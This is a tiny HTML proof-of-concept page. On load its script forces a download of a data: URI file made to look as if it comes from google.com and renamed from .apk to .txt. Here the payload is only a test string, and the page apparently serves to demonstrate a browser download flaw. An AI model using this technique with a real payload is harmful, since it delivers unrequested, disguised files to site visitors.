<!DOCTYPE html>
<html>
<head>
  <title>Auto Download</title>
</head>
<body>
  <center><h2>POC by pajarpriandana!</h2></center>

  <script>
    window.onload = function() {
      // Link pake data:// tapi ekstensi diubah jadi .txt
      const link = document.createElement('a');
      link.href = "data://google.com/application/octet-stream;base64,ZXN0dGVzdGVzdHRlc3Q=";
      link.download = "google.txt"; // <-- GANTI .apk jadi .txt
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    };
  </script>
</body>
</html>
